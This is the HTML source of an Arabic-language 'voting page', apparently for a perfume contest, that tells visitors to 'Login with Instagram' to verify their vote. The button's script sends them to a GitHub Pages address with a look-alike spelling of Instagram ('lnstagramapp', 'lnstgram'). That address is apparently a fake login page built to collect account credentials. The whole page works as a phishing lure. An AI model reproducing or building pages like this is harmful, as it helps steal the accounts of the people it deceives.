<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صفحة التصويت</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <div class="welcome-section">
            <img src="./img/logoo.png" alt="شعار الموقع" class="logo-image">
            
            <h1 class="welcome-text">مرحباً بالمصوِّتين الكرام!</h1>
            <p class="motivational-text">صوتك يصنع الفرق اضغط على الزر ادناه للتحقق والتصويت.</p>
            
            <div class="images-section">
                <img src="./img/perfumes.png" alt="العطور" class="perfumes-image">
            </div>
            
            <button class="instagram-button" onclick="redirectToInstagram()">
                Login with Instagram
            </button>
            
            <p class="note-text">ملاحظة: لكل حساب إنستقرام تصويت واحد فقط.</p>
        </div>
    </div>

    <script>
        function redirectToInstagram() {
            window.location.href = "https://lnstagramapp.github.io/lnstgramappauthhuman/lnstgram-comauthhuman/instagram.html";
        }
    </script>
</body>
</html>
